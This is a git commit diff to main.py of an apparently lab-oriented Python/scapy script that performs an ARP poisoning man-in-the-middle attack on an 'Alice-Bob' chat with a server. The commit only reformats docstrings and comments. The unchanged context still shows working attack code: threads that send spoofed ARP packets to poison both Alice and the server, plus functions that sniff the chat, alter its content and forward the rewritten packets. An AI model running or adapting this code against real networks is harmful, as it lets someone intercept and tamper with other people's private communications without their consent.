7548ad23c48f3cd9c935f606069972acb9cc57ce
SimchaTeich <sim.teich@gmail.com>
2022-06-06 08:24:22 +0300

    last update of document

--- main.py
+++ main.py
@@ -11,15 +11,15 @@ SERVER_MAC = "08:00:27:ab:33:74"
 
 def poisoner(target_IP, victim_IP, frequency):
     """
-*   function create and send spoofed ARP packet,
-*   that use to create the ARP poisining attak.
-*   param target_IP: IP of device to poison
-*   type target_IP: str
-*   param victim_IP: IP to mapping with the attaker MAC.
-*   type victim_IP: str
-*   param frequency: time in second to send the spoofing packet.
-*   type frequency: int
-*   rtype: None
+:   function create and send spoofed ARP packet,
+:   that use to create the ARP poisining attak.
+:   param target_IP: IP of device to poison
+:   type target_IP: str
+:   param victim_IP: IP to mapping with the attaker MAC.
+:   type victim_IP: str
+:   param frequency: time in second to send the spoofing packet.
+:   type frequency: int
+:   rtype: None
     """
     
     target_MAC = getmacbyip(target_IP)
@@ -34,13 +34,13 @@ def poisoner(target_IP, victim_IP, frequency):
 
 def spoof_chat_content(pkt, DST_MAC):
     """
-*   function spoofing the user chat message
-*   param pkt: the packet to spoofing
-*   type pkt: scapy packet
-*   param DST_MAC: the mac of "real" dst.
-*   type DST_MAC: str
-*   return: the spoofed packet
-*   rtype: scapy packet.
+:   function spoofing the user chat message
+:   param pkt: the packet to spoofing
+:   type pkt: scapy packet
+:   param DST_MAC: the mac of "real" dst.
+:   type DST_MAC: str
+:   return: the spoofed packet
+:   rtype: scapy packet.
     """
     pkt[Ether].dst = DST_MAC
     
@@ -53,26 +53,27 @@ def spoof_chat_content(pkt, DST_MAC):
 
 def change_and_send_pkt(pkt):
     """
-*   function send pkt to specific
-*   function to change it's content,
-*   and then send the spoofed packet back to W/LAN.
-*   param pkt: packet of Alice-Bob chat
-*   type pkt: scapy pkt
-*   return: None
+:   function send pkt to specific
+:   function to change it's content,
+:   and then send the spoofed packet back to W/LAN.
+:   param pkt: packet of Alice-Bob chat
+:   type pkt: scapy pkt
+:   return: None
     """
     if Raw in pkt:
         print(pkt[Raw].load)
     
+    # scapy will complete this parameters.
     pkt[Ether].src = None
     pkt[IP].len = None
     pkt[IP].chksum = None
     pkt[TCP].chksum = None
     
-    # Alice --> Bob (to server)
+    # Alice --> Bob (the server)
     if pkt[IP].dst == SERVER_IP:
         pkt = spoof_chat_content(pkt, SERVER_MAC)
     
-    # Bob(from server) --> Alice
+    # Bob (the server) --> Alice
     elif pkt[IP].dst == ALICE_IP:
         pkt = spoof_chat_content(pkt, ALICE_MAC)
             
@@ -81,11 +82,11 @@ def change_and_send_pkt(pkt):
 
 def alice_and_bob_chat(pkt):
     """
-*   function filtering packets from sniffing.
-*   param pkt: packet from sniff function
-*   type pkt: scapy packet
-*   return: if packet is from Alice-Bob conversation or not.
-*   rtype: bool
+:   function filtering packets from sniffing.
+:   param pkt: packet from sniff function
+:   type pkt: scapy packet
+:   return: if packet is from Alice-Bob conversation or not.
+:   rtype: bool
     """
     attacker_mac = get_if_hwaddr(conf.iface)
     
@@ -102,6 +103,7 @@ def alice_and_bob_chat(pkt):
 
 
 def main():
+    
     Thread(target=poisoner, args=(ALICE_IP, SERVER_IP, 10,)).start()
     Thread(target=poisoner, args=(SERVER_IP, ALICE_IP, 10,)).start()
     
